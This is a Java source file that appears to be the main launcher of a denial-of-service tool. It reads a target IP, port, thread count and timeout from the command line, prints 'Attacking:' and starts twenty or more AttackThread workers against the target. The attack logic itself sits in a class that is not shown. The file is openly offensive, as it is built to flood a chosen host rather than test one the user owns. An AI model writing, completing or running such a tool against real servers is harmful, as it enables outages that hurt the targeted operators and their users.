package com.main;

public class Main 
{
	private String ip;
	private int port;
	private int threads = 20;
	private int sleepBetween = 2;
	private int timeout = 7;
	private AttackThread[] attackThread;
	
	public Main()
	{
		
	}
	
	public static void main(String[] args) 
	{
		Main main = new Main();
		main.verificaArgs(args);
		main.run();
	}
	
	
	public void verificaArgs(String[] args)
	{
		for(int i = 0; i < args.length; i++)
		{
			if(args[i].equals("-ip"))
			{
				if(args[i+1]!=null)
				{
					try
					{
						ip =args[i+1];
					} catch(Exception ex){ System.out.println("Erro ao definir ip!"); System.exit(0); };
					
				}
			}
			
			if(args[i].equals("-port"))
			{
				if(args[i+1]!=null)
				{
					try
					{
						port = Integer.parseInt(args[i+1]);
					} catch(Exception ex){ System.out.println("Erro ao definir Porta!"); System.exit(0); };
					
				}
			}
			
			if(args[i].equals("-threads"))
			{
				if(args[i+1]!=null)
				{
					try
					{
						threads = Integer.parseInt(args[i+1]);
					} catch(Exception ex){ System.out.println("Erro ao definir threads!"); System.exit(0); };
					
				}
			}
			
			if(args[i].equals("-timeout"))
			{
				if(args[i+1]!=null)
				{
					try
					{
						timeout = Integer.parseInt(args[i+1]);
					} catch(Exception ex){ System.out.println("Erro ao definir timeout!"); System.exit(0); };
					
				}
			}
			
		}
	}
	
	public void run()
	{
		System.out.println("Attacking: "+ip+":"+port);
		attackThread = new AttackThread[threads];
		for(int i = 0; i < threads; i ++)
		{
			attackThread[i] = new AttackThread(ip, port, sleepBetween, timeout);
			attackThread[i].start();
		}
		
		
	}

}
